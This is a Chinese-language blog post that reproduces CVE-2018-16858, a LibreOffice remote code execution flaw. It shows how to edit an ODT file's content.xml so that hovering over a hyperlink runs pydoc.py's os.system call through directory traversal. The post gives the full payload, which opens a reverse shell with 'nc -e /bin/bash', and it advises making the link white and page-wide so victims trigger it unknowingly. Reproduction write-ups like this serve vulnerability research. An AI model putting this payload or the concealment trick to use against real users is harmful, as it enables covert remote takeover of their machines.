---
title: libreoffice命令执行复现
tags:
  - CVE
  - libreoffice
categories:
  - 漏洞复现
copyright: true
abbrlink: cdf8e41e
date: 2019-07-13 16:19:25
---

![](https://s2.ax1x.com/2019/07/13/Z4drIs.jpg)
<!--more-->
### Start ###

打开Libreoffice writer新建个'word':

插入(Insert) => 超链接(Hyperlink) => 设置(图标)，添加个鼠标事件，保存为odt文档:

![](https://s2.ax1x.com/2019/07/13/Z4NnxS.png)

使用解压工具解压/查看odt文件，把`content.xml`拖出来,看下里面有什么内容。

![](https://s2.ax1x.com/2019/07/13/Z4NKKg.png)

可以看到这是类似一个加载本地的一个脚本然后使用python运行的。

```
<script:event-listener script:language="ooo:script" script:event-name="dom:mouseover" xlink:href="vnd.sun.star.script:pythonSamples|TableSample.py$createTable?language=Python&amp;location=share" xlink:type="simple"/>
```

作者文章中写到：Libreoffice自带有Python和预装部分脚本，还可以通过目录遍历访问(调用)其他脚本。

在`LibreOffice\program\python-core-3.5.5\lib\`中的`pydoc.py`通过参数cmd传递给`os.system()`执行，而且还没有做过滤。

![](https://s2.ax1x.com/2019/07/13/Z4Nm28.png)

So，通过修改`content.xml`内容重新压缩回odt文件，当打开odt文件鼠标碰到超链接是，就会触发反弹shell。

```
<script:event-listener script:language="ooo:script" script:event-name="dom:mouseover" xlink:href="vnd.sun.star.script:../../../program/python-core-3.5.5/lib/pydoc.py$tempfilepager(1, nc -e /bin/bash 127.0.0.1 12345)?language=Python&amp;location=share" xlink:type="simple"/>
```

![](https://s2.ax1x.com/2019/07/13/Z4Ne8f.png)

### Video ###

<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=63298083&bvid=BV1c4411Q7KM&cid=109925123&page=1"  scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"></iframe></div>

### END ###

为了增加触发率，可以设置超链接为白色并遍布整个页面

新版中，python鼠标事件好像已被移除

**Reference**

https://insert-script.blogspot.com/2019/02/libreoffice-cve-2018-16858-remote-code.html

https://testofpen.wordpress.com/2019/05/13/cve-2018-16858/